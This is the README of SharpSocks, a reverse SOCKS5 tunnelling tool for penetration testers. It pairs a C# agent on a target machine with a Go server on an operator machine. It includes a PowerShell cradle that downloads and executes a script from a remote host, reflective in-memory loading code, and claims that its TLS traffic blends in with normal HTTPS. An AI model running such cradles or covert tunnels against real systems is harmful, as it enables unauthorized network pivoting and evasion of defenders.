# SharpSocks

`SharpSocks` is a reverse SOCKS5 proxy composed of a C# agent that connects to the Go server component, which exposes a local SOCKS5 proxy. Traffic from SOCKS clients is tunneled through the agent to reach the target network.

```
 [socks client]:> [sharpsocks-server :1080] <==tunnel==> [SharpSocks agent]:> [target network]
                     (operator machine)                     (target machine)
```

> **WARNING** This tool is for **authorized security testing only**.
> Unauthorized use may violate laws and regulations.
> The author and contributors are not responsible for misuse.
> Always obtain explicit permission before testing any system.

---

## Features

- **Reverse connection**: agent connects out to server, no inbound ports needed on the target
- **SOCKS5 with mandatory authentication**: username/password required for all proxy clients
- **Encrypted tunnel**: AES-256-CBC with HMAC-SHA256 (encrypt-then-MAC), PBKDF2-SHA256 key derivation
- **HMAC challenge-response**: pre-shared password authentication between agent and server
- **TLS transport**: optional TLS wrapping with auto-generated self-signed cert and SHA256 fingerprint pinning
- **Reflective loading**: agent is a standard .NET assembly, loadable via `Assembly.Load()`
- **PowerShell loader**: build produces a ready-to-use `.ps1` cradle per framework version
- **Cross-platform server**: static Go binaries for linux, windows, darwin (amd64 + arm64)
- **.NET Framework targets**: agent compiles for net452 and net472

---

## Build

Requires Docker.

```
make
```

Output:

```
dist/
  agent/
    net452/
      SharpSocks.exe
      SharpSocks.ps1
    net472/
      SharpSocks.exe
      SharpSocks.ps1
  server/
    linux-amd64/sharpsocks-server
    linux-arm64/sharpsocks-server
    windows-amd64/sharpsocks-server.exe
    windows-arm64/sharpsocks-server.exe
    darwin-amd64/sharpsocks-server
    darwin-arm64/sharpsocks-server
```

---

## Usage

### Server Command-Line flags

```
sharpsocks-server -agent-password <pass> -socks-username <user> -socks-password <pass> -transport tls
```

All server flags:

```
-agent-password string    pre-shared password for agent authentication (required)
-socks-username string    SOCKS5 proxy username (required)
-socks-password string    SOCKS5 proxy password (required)
-agent-bind string        agent listener bind address (default "0.0.0.0")
-agent-port int           agent listener port (default 443)
-socks-bind string        SOCKS5 proxy bind address (default "127.0.0.1")
-socks-port int           SOCKS5 listener port (default 1080)
-transport string         agent transport: raw or tls (default "raw")
-verbose                  enable verbose logging
```

When `-transport tls` is used, the server generates a self-signed certificate and prints its SHA256 fingerprint for optional agent-side pinning.

### Agent Command-Line flags

Standalone:

```
SharpSocks.exe --server <host> --agent-password <pass> --transport tls --tls-fingerprint <sha256>
```

Reflective loading:

```csharp
byte[] raw = File.ReadAllBytes("SharpSocks.exe");
Assembly asm = Assembly.Load(raw);
asm.GetType("SharpSocks.Agent.Entry")
   .GetMethod("Execute")
   .Invoke(null, new object[] { new string[] {
       "--server", "10.0.0.1",
       "--agent-password", "secret",
       "--transport", "tls"
   }});
```

PowerShell (download cradle):

```powershell
(New-Object System.Net.WebClient).DownloadString("http://<host>/SharpSocks.ps1") | iex
```

PowerShell (inline):

```powershell
[SharpSocks.Agent.Entry]::Execute("--server 10.0.0.1:agent-password secret:transport tls".Split())
```

To stop gracefully:

```powershell
[SharpSocks.Agent.Entry]::Stop()
```

All agent flags:

```
--server <host>            server address (required)
--port <port>              server port (default: 443)
--agent-password <pass>    pre-shared password (required, must match server)
--transport <raw|tls>      transport mode (default: raw)
--tls-fingerprint <sha256> pin server cert by SHA256 fingerprint (optional)
--retry <seconds>          base retry delay (default: 5)
--max-retries <n>          max reconnect attempts, 0=infinite (default: 5)
--verbose                  enable verbose logging
```

### Proxying traffic

Once connected, use the SOCKS5 proxy on the server side:

```
curl -x socks5://user:pass@127.0.0.1:1080 http://internal-host/
```

Or configure proxychains, Burp, browser, etc. to use `127.0.0.1:1080` with SOCKS5 username/password authentication.

## Security

The tunnel uses layered security independent of the transport mode:

1. **Authentication**: HMAC-SHA256 challenge-response with mutual nonce exchange proves knowledge of the pre-shared password without transmitting it
2. **Key derivation**: PBKDF2-SHA256 (10,000 iterations) derives a 64-byte session key from the password and both nonces
3. **Encryption**: AES-256-CBC with per-frame random IV encrypts all payloads including empty control frames
4. **Integrity**: HMAC-SHA256 over (frame header || IV || ciphertext) authenticates every frame, preventing tampering and injection
5. **TLS transport**: optional TLS 1.2+ wrapping makes the connection indistinguishable from normal HTTPS traffic to network observers
6. **Certificate pinning**: agent can pin the server certificate by SHA256 fingerprint to prevent MITM
7. **SOCKS5 authentication**: mandatory username/password authentication on the proxy endpoint
8. **Constant-time comparisons**: all credential and MAC checks use constant-time comparison to prevent timing side-channels

---

## Disclaimer

`SharpSocks` is provided "as is" without warranties.
The authors assume no responsibility for misuse.
Use only for research or authorized security assessments.

---

## License

This project is licensed under the GNU GENERAL PUBLIC LICENSE.
See the [LICENSE](LICENSE) file for more details.
